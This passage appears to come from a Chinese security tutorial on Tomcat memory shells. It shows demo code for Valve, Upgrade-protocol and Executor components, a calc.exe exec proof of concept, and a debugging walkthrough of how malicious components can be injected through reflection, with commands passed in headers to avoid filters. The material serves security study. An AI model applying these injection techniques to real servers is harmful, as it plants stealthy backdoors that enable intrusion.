package org.example.valvememoryshelldemo.test;

import java.io.IOException;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.valves.ValveBase;
import org.springframework.stereotype.Component;

@Component
public class TestValve extends ValveBase {
    @Override
    public void invoke(Request request, Response response) throws IOException {
        response.setContentType("text/plain");
        response.setCharacterEncoding("UTF-8");
        response.getWriter().write("Valve 被成功调用");
    }
}


```

还有`TestConfig.java`：

```
package org.example.valvememoryshelldemo.test;

import org.apache.catalina.Valve;
import org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;
import org.springframework.boot.web.server.WebServerFactoryCustomizer;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
public class TestConfig {
    @Bean
    public WebServerFactoryCustomizer<TomcatServletWebServerFactory> tomcatCustomizer() {
        return factory -> {
            factory.addContextValves(getTestValve());
        };
    }
    
    @Bean
    public Valve getTestValve() {
        return new TestValve();
    }
}


```

运行效果如下：![](../../.resource/remote/fb490dad3d96304bc3e72c43ed0b7364a2241cab5a2057c3b0d3528cd58d7167.png)

### 2.13.3 Tomcat Valve 打入内存马思路分析

我们通常情况下用的都是`ValveBase`，点进这个`ValveBase`，可以看到是实现了`Valve`接口：

![](../../.resource/remote/c0a7626d890911c310fd8a90bcd3c8e58d831bf0778aadffcf6801cbbeadf24b.png)

点进`valve`可以看到该接口代码如下，这里我加上了注释：

```
package org.apache.catalina;

import java.io.IOException;
import javax.servlet.ServletException;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;

public interface Valve {
    // 获取下一个阀门
    public Valve getNext();
    // 设置下一个阀门
    public void setNext(Valve valve);
    // 后台执行逻辑，主要在类加载上下文中使用到
    public void backgroundProcess();
    // 执行业务逻辑
    public void invoke(Request request, Response response)
        throws IOException, ServletException;
    // 是否异步执行
    public boolean isAsyncSupported();
}


```

接下来就是调试看看这个`valve`的运行流程了，我们在`invoke`函数这里下断点调试：

![](../../.resource/remote/baa57a6e9e8f812bd7d476734430d8f616036c4cbd22f94e62095fee0e9983db.png)

我们看向左下角，看看之前调用到的`invoke`方法：

在`StandardHostValve.java`中，代码为：

```
context.getPipeline().getFirst().invoke(request, response);


```

![](../../.resource/remote/09074315adb8f11140fc0ca2fbad6064fe9868dea7db7bf416f109a811de878f.png)

在`StandardEngineValve.java`中，代码为：

```
host.getPipeline().getFirst().invoke(request, response);


```

![](../../.resource/remote/5baf22dae3b7ac0933ccf9c002abacb0b37c168ea1cc13a86aeeea6660b70224.png)

之后的诸如`Http11Processor.java`和多线程的部分就不需要我们关注了。既然我们的目的是打入内存马，那根据我们掌握的`Tomcat Servlet/Filter/Listener`内存马的思路来看，我们需要通过某种方式添加我们自己的恶意`valve`。

我们去掉之前打的断点，在`StandardHostValve.java`这里打上断电并重新调试：

![](../../.resource/remote/60ae8b9f8c69a681fdb41f5fdf0e976ee2d01606f51d94e9c974c315122c30e8.png)

然后`step into`：

![](../../.resource/remote/7527f6d630cf224e41dddc87b590ab9b993140de4d0e78c061b6f9127fc4fca9.png)

鼠标左键单击这里的`getPipeline`即可进入到所调用的函数实现的位置：

![](../../.resource/remote/62f0ffc13476824f82d06919f9fdca9676e00f104498a6cdeb0d3d9a14c3bcea.png)

再`Ctrl+H`进入`Pipeline`接口，可以看到是有个`addValve`方法：

![](../../.resource/remote/e92d025eb34cc586e55242f2995fb3f89ef886f37f1680b2d0b80a1eb3c5cfba.png)

这不正是我们需要的吗？我们去看看它是在哪儿实现的，直接在`addValve`函数处`Ctrl+H`找继承该接口的类，可可以看到是在`org.apache.catalina.core.StandardPipeline`中：

![](../../.resource/remote/5ed08b3ab8de68201383a5c18ebde2eb0c2e06195967f112160ed9ee9bb9ec25.png)image-20240130155445230

但是问题就来了，我们无法直接获取到这个`StandardPipeline`，而我们能直接获取到的是`StandardContext`，那就去看看`StandardContext.java`中有没有获取`StandardPipeline`的方法。

一眼就能看到我们的老熟人——`getPipeline`方法：

![](../../.resource/remote/982dfbacf48cbf7a7040c85f7f3ca47c7d6b6139911d20771f0a839532ee71f9.png)

那这样以来我们的思路就可以补充完整了，先反射获取`StandardContext`，然后编写一个恶意`Valve`，最后通过`StandardContext.getPipeline().addValve()`添加就可以了。当然，我们也可以反射获取`StandardPipeline`，然后再`addValve`，这样也是可以的。

2.14 Tomcat Upgrade 介绍与打入内存马思路分析
--------------------------------

### 2.14.1 编写一个简单的 Tomcat Upgrade 的 demo

#### 2.14.1.1 利用 SpringBoot 搭建

我这里在之前的`Tomcat Valve`项目的基础上做了简单的修改，删除之前`test`目录下的`TestValve.java`，新建一个`TestUpgrade.java`：

```
package org.example.valvememoryshelldemo.test;

import org.apache.coyote.*;
import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
import org.apache.tomcat.util.net.SocketWrapperBase;
import org.springframework.context.annotation.Configuration;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;

@Configuration
public class TestUpgrade implements UpgradeProtocol {
    @Override
    public String getHttpUpgradeName(boolean b) {
        return "hello";
    }

    @Override
    public byte[] getAlpnIdentifier() {
        return new byte[0];
    }

    @Override
    public String getAlpnName() {
        return null;
    }

    @Override
    public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
        return null;
    }

    @Override
    public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapper, Adapter adapter, Request request) {
        return null;
    }

    public boolean accept(org.apache.coyote.Request request) {

        try {
            Field response = org.apache.coyote.Request.class.getDeclaredField("response");
            response.setAccessible(true);
            Response resp = (Response) response.get(request);
            resp.doWrite(ByteBuffer.wrap("\n\nHello, this my test Upgrade!\n\n".getBytes()));
        } catch (Exception ignored) {}
        return false;
    }
}


```

然后修改`TestConfig.java`如下：

```
package org.example.valvememoryshelldemo.test;

import org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;
import org.springframework.boot.web.server.WebServerFactoryCustomizer;
import org.springframework.stereotype.Component;

@Component
public class TestConfig implements WebServerFactoryCustomizer<TomcatServletWebServerFactory> {

    @Override
    public void customize(TomcatServletWebServerFactory factory) {
        factory.addConnectorCustomizers(connector -> {
            connector.addUpgradeProtocol(new TestUpgrade());
        });
    }
}


```

运行之后命令行执行命令`curl -H "Connection: Upgrade" -H "Upgrade: hello" http://localhost:8080`，效果如下：

![](../../.resource/remote/a8d8ccaa2fb77dce52078147bdfdeda0d7e549b761b3399b72382d79bcfaa6b2.png)

#### 2.14.1.2 利用 Tomcat 搭建

当然也是可以利用`Tomcat`来搭建的，只需要`TestUpgrade.java`即可，因为里面含有定义的`servlet`逻辑：

```
package org.example;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Request;
import org.apache.coyote.Adapter;
import org.apache.coyote.Processor;
import org.apache.coyote.UpgradeProtocol;
import org.apache.coyote.Response;
import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
import org.apache.tomcat.util.net.SocketWrapperBase;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;

@WebServlet("/evil")
public class TestUpgrade extends HttpServlet {

    static class MyUpgrade implements UpgradeProtocol {
        @Override
        public String getHttpUpgradeName(boolean b) {
            return null;
        }

        @Override
        public byte[] getAlpnIdentifier() {
            return new byte[0];
        }

        @Override
        public String getAlpnName() {
            return null;
        }

        @Override
        public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
            return null;
        }

        @Override
        public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapperBase, Adapter adapter, org.apache.coyote.Request request) {
            return null;
        }

        @Override
        public boolean accept(org.apache.coyote.Request request) {
            try {
                Field response = org.apache.coyote.Request.class.getDeclaredField("response");
                response.setAccessible(true);
                Response resp = (Response) response.get(request);
                resp.doWrite(ByteBuffer.wrap("Hello, this my test Upgrade!".getBytes()));
            } catch (Exception ignored) {}
            return false;
        }
    }
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        try {
            RequestFacade rf = (RequestFacade) req;
            Field requestField = RequestFacade.class.getDeclaredField("request");
            requestField.setAccessible(true);
            Request request1 = (Request) requestField.get(rf);
            new MyUpgrade().accept(request1.getCoyoteRequest());
        } catch (Exception ignored) {}
    }
}


```

效果如下：

![](../../.resource/remote/59652ae904aa1a9412ede7e01dfd2b17c96ba2e417a853be67552ad0eb22b24f.png)

### 2.14.2 Tomcat Upgrade 内存马介绍与相关代码调试分析

这部分主要参考了`Sndav`师傅的文章（原文地址为`https://tttang.com/archive/1709/`，但是由于图片链接挂掉导致图片无法显示，我们可以访问如下地址查看：`https://web.archive.org/web/20220823040415/https://tttang.com/archive/1709/`）以及`p4d0rn`师傅的文章（`https://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/upgrade`）。

和之前所提到的`Spring Interceptor`型内存马有点类似，在渗透过程中，尽管我们打入了内存马，但是因为原有的 Filter 包含鉴权或者其他功能，可能会导致我们的内存马无法访问，或者因为反向代理而导致我们无法找到对应的路径，这就需要我们在到`Filter`这一步之前就得打入内存马。

这里，我引用码哥字节文章（`https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09`）里面的一张`Tomcat`架构图：

![](../../.resource/remote/78f9ac7914793a0f532ff4edaf5f43c2ff6e5ec9db8578d0f4bf6a28053e27bc.png)

可以清楚地看到，在此之前还有`Executor`和`Processor`两个模块，本节内容主要讨论后者，在下节中我们会讨论前者。

这一部分需要更加完备的`Tomcat`的相关知识，不再满足于之前的四个容器，关于这些基础知识的学习，强烈建议看码哥字节的文章，写的确实特别的好：

> https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09

其实在之前学习`Tomcat Valve`的过程中，当时我是一步步`step over`跟完了所有的代码的，我当时也提了一嘴`Http11Processor`。我们还是以当时的项目为例来看。

我们还是在`StandardHostValve.java`的这行打上断点：

![](../../.resource/remote/fe9d9ffa7c50fdaf83b2ca7afd1235cd759d4124a8f165334de7957a08d1ee2c.png)

从上面我红色箭头所指出的地方就可以看到调用到了`process`函数，具体调用位置位于`org.apache.coyote.AbstractProcessorLight#process`，我们跟过去看看：

![](../../.resource/remote/165de7002e8177151acd27d6aeb66a27884e5b2641dda286d6557423f673a20d.png)

可以看到，如果当前`SocketWrapperBase`的状态是`OPEN_READ`的时候，才会调用对应的`processor`去处理（第二张图的`process`调用的位置可以通过第一张图左下角的那个`process`的后一个`process`点进去看到）：

![](../../.resource/remote/03cbbb2af4874fe5462d200e774c9a401c955501f67fedd705e12577f12186b4.png)![](../../.resource/remote/83b9da25e6b91cf689b3886c84ed123bd72fcb5f0b1cdef234f101be36e319a7.png)

我们继续`step into`这里的`service`方法看看：

![](../../.resource/remote/23c24c3bc7dd3354b96c53c0d4d5d1ff367be127be3902fca03d29b7f7a3c616.png)

继续`step over`，可以看到这里在检查`header`中的`Connection`头中是否为`upgrade`，这一点可以通过`step into`这个`isConnectionToken`方法看到：

![](../../.resource/remote/d05ef4a55bab6e624fbd46d99b9f786d3b37c733ebdd8728260e52b21c5a0874.png)![](../../.resource/remote/03de7fe817578db976a8be7dd054df7f589450c058b12013484dbd80eb1468c7.png)

之后干两件事情：一是调用`getUpgradeProtocol`方法根据`upgradedName`从`httpUpgradeProtocols`拿到`UpgradeProtocol`；二是调用`UpgradeProtocol`对象的`accept`方法：

![](../../.resource/remote/887186c798ecd27587abd43a7fd28b20fec8e4e94f543bd3310a953a29a7cf9e.png)![](../../.resource/remote/f8bc2497c4787857edb10f77482a49844ab4966b1f434e78175582ded2b23e0c.png)

到了这里，我们似乎可以建立起一个猜想，和之前介绍的内存马类似，我们只要构造一个恶意的`UpgradeProtocol`，然后把它插入到`httpUpgradeProtocols`。

由于`httpUpgradeProtocols`是一个`hashmap`，那么向里面添加的话用到的肯定是`put`方法，直接搜`httpUpgradeProtocols.put`：

![](../../.resource/remote/8625db6ccc1bfee2d004f7c8200e58f51b6974d4f6ab3c63193386494de6ed8c.png)

我们在这行打上断点，然后调试，发现在我们没有执行`curl -H "Connection: Upgrade" -H "Upgrade: hello" http://localhost:8080`这条命令之前，断点就到了，也就是说，`httpUpgradeProtocols.put`这个事情是发生在`tomcat`启动的时候的。

那这样一来，思路就更加具体了一点：反射找到`httpUpgradeProtocols`，把恶意`upgradeProtocol`插入进去即可构成`upgrade`内存马，思路和之前是一模一样的。

那现在只需要解决最后一个问题——如何找到`httpUpgradeProtocols`的位置。我们打开之前用`tomcat`搭建的`Tomcat Upgrade`的`demo`，在如下位置打下断点，然后执行命令`curl -H "Connection: Upgrade" -H "Upgrade: hello" http://localhost:8080/evil`进入断点调试：：![](../../.resource/remote/0d82adc86040f6135785ef44396977f193d9cc164a65f9593de4b79875a8b034.png)

`step over`一步即可在下方看到`request1`属性：

![](../../.resource/remote/187fee114d9340b5eba27adec0a76f44b2af3e5ec76abe2ecdda621ff8802acb.png)

然后在`request1`里面的`connector`的`protocolHandler`里面发现了`httpUpgradeProtocols`：

![](../../.resource/remote/b9f1be28bb4ea83edf7fd3eae8e03c5a23b43afc75a781a17d684b16f5d64bb3.png)

接下来就是一步步地反射了。

2.15 Tomcat Executor 内存马介绍与打入内存马思路分析
------------------------------------

### 2.15.1

新建一个项目，配置好`tomcat`运行环境和`web`目录，然后新建以下两个文件，第一个是 TestExecutor.java：

```
package org.example;

import java.io.IOException;
import java.util.concurrent.SynchronousQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public class TestExecutor extends ThreadPoolExecutor {

    public TestExecutor() {
        super(0, Integer.MAX_VALUE, 60L, TimeUnit.SECONDS, new SynchronousQueue<>());
    }

    @Override
    public void execute(Runnable command) {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        super.execute(command);
    }
}


```

第二个是`TestServlet.java`：

```
package org.example;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/test")
public class TestServlet extends HttpServlet {
    TestExecutor executor = new TestExecutor();

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        executor.execute(() -> {
            System.out.println("Execute method triggered by accessing /test");
        });
    }
}


```

然后访问浏览器对应`context`下的`test`路由：

![](../../.resource/remote/ac97057b62be164101bd853c85055682cfc10e81b3c39b4bf2546fa55cca9c00.png)

### 2.15.2 Tomcat Executor 内存马介绍与代码调试分析

在`2.14.2`节中，我们聊到过可以在`Executor`模块中打入内存马，本节就来分析具体流程。本节主要参考文章为以下四篇：

> https://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/executor
> 
> https://cjlusec.ldxk.edu.cn/2023/02/15/Executor/
> 
> https://xz.aliyun.com/t/11593
> 
> https://xz.aliyun.com/t/11613

在我之前提到过的讲 tomcat 架构的基础文章（`https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09`），有详细地讲述`ProtocolHandler`组件中的`EndPoint`部件，如果之前没有看完整地可以再去看下。里面这张图画的很好，我这里作引用：

![](../../.resource/remote/bec6e97925da59b5ab034851e71dac8d41bd926d9714d8dfafa2b88bd33e88fa.jpg)

#### 2.15.2.1 Endpoint 五大组件

如下表所示：

<table><thead><tr><th>组件</th><th>描述</th></tr></thead><tbody><tr><td><code>LimitLatch</code></td><td>连接控制器，控制最大连接数</td></tr><tr><td><code>Acceptor</code></td><td>接收新连接并返回给<code>Poller</code>的<code>Channel</code>对象</td></tr><tr><td><code>Poller</code></td><td>监控<code>Channel</code>状态，类似于<code>NIO</code>中的<code>Selector</code></td></tr><tr><td><code>SocketProcessor</code></td><td>封装的任务类，处理连接的具体操作</td></tr><tr><td><code>Executor</code></td><td><code>Tomcat</code>自定义线程池，用于执行任务类</td></tr></tbody></table>

#### 2.15.2.2 Endpoint 分类

`EndPoint`接口的具体实现类为`AbstractEndpoint`，`AbstractEndpoint`具体的实现类有`AprEndpoint`、`Nio2Endpoint`、`NioEndpoint`：

![](../../.resource/remote/79db6edd40d65ef07ee43f0afca8db5ecfe7eb77b2eda99e96c85535250e100f.png)

<table><thead><tr><th>Endpoint</th><th>简要解释</th><th>Tomcat 源码位置</th></tr></thead><tbody><tr><td><code>AprEndpoint</code></td><td>使用<code>APR</code>模式解决异步<code>IO</code>问题，提高性能</td><td><code>org.apache.tomcat.util.net.AprEndpoint</code></td></tr><tr><td><code>Nio2Endpoint</code></td><td>使用代码实现异步<code>IO</code></td><td><code>org.apache.tomcat.util.net.Nio2Endpoint</code></td></tr><tr><td><code>NioEndpoint</code></td><td>使用<code>Java NIO</code>实现非阻塞<code>IO</code></td><td><code>org.apache.tomcat.util.net.NioEndpoint</code></td></tr></tbody></table>

上面所提到的`tomcat`，指的是如下`pom`依赖：

```
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-coyote</artifactId>
    <version>9.0.83</version>
</dependency>


```

![](../../.resource/remote/a441101cb2c19ecfdbe3a3b9866dec0e5a0bc7b3ac2bc67e3b4acc0dc22e8261.png)

`Tomcat`默认启动是以`NioEndpoint`来启动的，它是`Tomcat`中默认的负责使用`NIO`方式进行网络通信功能的模块，它负责监听处理请求连接，并将解析出的字节流传递给`Processor`进行后续的处理。

#### 2.15.2.3 Executor 相关代码分析

点开`Executor.java`即可看到有一个`execute`方法：

![](../../.resource/remote/51c3884bba80423f49349724a55c60c165578627e70954ef1fef1a80d5216943.png)`Ctrl+Alt+F7`追踪即可看到这个`Executor`接口在`AbstractEndpoint`这个抽象类中有相关实现：

![](../../.resource/remote/1b15ea623574270ad88da0d9c830c6724812d443023316f800ee0c6c2d0e0456.png)

在`AbstractEndpoint.java`中搜索`executor`，往下翻即可看到有`setExecutor`和`getExecutor`这两个函数：

![](../../.resource/remote/53879b2b3a6085667611fde26c834ebdb54da7485452193341dfc7993353e859.png)

查看`getExecutor`函数的调用位置，发现就在该文件中有一个关键调用：

![](../../.resource/remote/70d96c1c1d3a631f657af403b0c9e9ceb1bb2319bec49641f8b55f57dc3b0b96.png)

跟过去：

![](../../.resource/remote/9918d3c6adb4f87bb10af2496609fcb4032803bc314f3ccc575fdca01401c96e.png)

从下面这篇文章中我们可以知道`processSocket`在`Tomcat`运行过程中的作用：

> https://blog.51cto.com/u_8958931/2817418

那此时我们就有一个想法，如果我能控制`executor`，我把原来的`executor`通过`setExecutor`变成我恶意创建的`executor`，然后再通过这后面的`executor.execute`（`org.apache.tomcat.util.threads.ThreadPoolExecutor#execute(java.lang.Runnable)`）一执行就可以加载我们的恶意逻辑了。

但是现在有一个很头疼的问题，那就是标准的`ServletRequest`需要经过`Adapter`的封装后才可获得，这里还在`Endpoint`阶段，其后面封装的`ServletRequest`和`ServletResponse`无法直接获取。

那怎么办呢？结合之前学过的知识，我们很容易想到在之前我们第一次接触`java-object-researcher`的时候，`c0ny1`师傅写的这篇文章：

> ![](../../.resource/remote/0f0a7e3a9e108d22e9340466cac710d72b736625823a8a0543ddfb5b192659e7.png)
> 
> http://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/
> 
> ![](../../.resource/remote/122f00e7434cf404c0d948985be326454141c86c677d3e425a9e6c7c495dd564.png)

那就试试看呗，我们导入`jar`包到项目之后修改`TestServlet.java`代码如下：

```
package org.example;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import me.gv7.tools.josearcher.entity.Blacklist;
import me.gv7.tools.josearcher.entity.Keyword;
import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;
import java.util.ArrayList;
import java.util.List;

@WebServlet("/test")
public class TestServlet extends HttpServlet {
    TestExecutor executor = new TestExecutor();

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        executor.execute(() -> {
            System.out.println("Execute method triggered by accessing /test");
        });
        List<Keyword> keys = new ArrayList<>();
        keys.add(new Keyword.Builder().setField_type("request").build());
        List<Blacklist> blacklists = new ArrayList<>();
        blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());
        SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
        searcher.setBlacklists(blacklists);
        searcher.setIs_debug(true);
        searcher.setMax_search_depth(10);
        searcher.setReport_save_path("D:\\javaSecEnv\\apache-tomcat-9.0.85\\bin");
        searcher.searchObject();
    }
}


```

接着访问路由，然后在控制台输出中搜索`request =` ：

![](../../.resource/remote/ebc0967e1ac6ef17f377aeb3f52944279cb90dad873d7256acf7ca4ccbc9eea8.png)

直接搜索到了这条链：

```
TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [15] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
       ---> connections = {java.util.Map<U, org.apache.tomcat.util.net.SocketWrapperBase<S>>} 
        ---> [java.nio.channels.SocketChannel[connected local=/0:0:0:0:0:0:0:1:8080 remote=/0:0:0:0:0:0:0:1:10770]] = {org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper} 
         ---> socket = {org.apache.tomcat.util.net.NioChannel} 
          ---> appReadBufHandler = {org.apache.coyote.http11.Http11InputBuffer} 
            ---> request = {org.apache.coyote.Request}


```

我们来验证一下，在`org/apache/tomcat/util/net/NioEndpoint.java`的这里下断点，不断`step over`，就可以找到这里的`request`的位置：

![](../../.resource/remote/4d981f0665e809c6c158550acc84213a1ded1f390cb8f07ca190a120b5a089b6.png)

点开这里的`byteBuffer`，可以看到它是一个字节数组，右键找到`View as ... String`即可变成字符串：

![](../../.resource/remote/adcee02dd46b3416ee24bb604117d2ccbc709d2ba584ff1edaefa51a008d662d.png)![](../../.resource/remote/1292f2d8b0de4284a12796044714dc1bbb749322b40745ee31dd146f080e4af7.png)

再点击上面我指出来的`View Text`即可清楚看到具体内容：

![](../../.resource/remote/cc17a517a4c9edf6ca8d271e046c7654626d8eef00b73a346fc008afb67e045f.png)

这就意味着我们可以把命令作为`header`的一部分传入，再把结果作为`header`的一部分传出即可。

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
